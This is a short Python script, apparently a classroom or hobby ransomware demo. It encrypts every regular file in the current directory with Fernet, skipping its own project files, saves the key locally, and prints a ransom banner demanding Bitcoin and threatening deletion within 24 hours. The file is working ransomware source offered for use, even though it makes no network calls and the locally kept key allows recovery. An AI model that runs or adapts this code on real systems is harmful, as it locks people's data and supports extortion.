# Activate virtual environment before running the script:
# source .venv/bin/activate   --- for macOS/Linux
# .venv\Scripts\activate      --- for Windows

import os
from cryptography.fernet import Fernet

# finding files
files = []
for file in os.listdir():
    if file == "the_malware.py" or file == "thekey.key" or file == "decrypt.py" or file == "README.md" or file == "requirements.txt": # process every file except the script itself, the key file, the decryption script, the README file and the requirements file
        continue
    if os.path.isfile(file): # process only files
        files.append(file)

print("Files found:", files)

key = Fernet.generate_key()

# print("Key generated:", key)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("\n" + "="*60)
print("🚨 DANGER! YOUR FILES HAVE BEEN ENCRYPTED! 🚨")
print("="*60)
print("""
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
""")
print("⚠️  ALL YOUR FILES HAVE BEEN LOCKED! ⚠️")
print("💀 Send 1000000000 Bitcoin or they will be DELETED! 💀")
print("🔐 Files encrypted:", len(files), "files")
print("⏰ You have 24 hours before permanent deletion!")
print("="*60)
